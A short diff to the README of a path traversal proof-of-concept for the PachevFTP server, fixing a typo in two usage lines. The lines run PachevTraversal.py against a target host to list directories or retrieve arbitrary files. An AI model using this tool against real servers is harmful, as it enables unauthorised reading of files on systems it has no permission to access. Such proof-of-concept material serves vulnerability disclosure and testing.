@@ -12,12 +12,12 @@ A simple path traversal proof-of-concept on [PachevFTP](https://github.com/pache
 Enumerate and list folders:
 
 ```
-python3 PachevTraversal.py -i <TargetIP> -p <TargetPort) -l <TargetDirectory>
+python3 PachevTraversal.py -i <TargetIP> -p <TargetPort> -l <TargetDirectory>
 ```
 
 Retrieve a file:
 
 ```
-python3 PachevTraversal.py -i <TargetIP> -p <TargetPort) -r <TargetFilePath>
+python3 PachevTraversal.py -i <TargetIP> -p <TargetPort> -r <TargetFilePath>
 ```
 
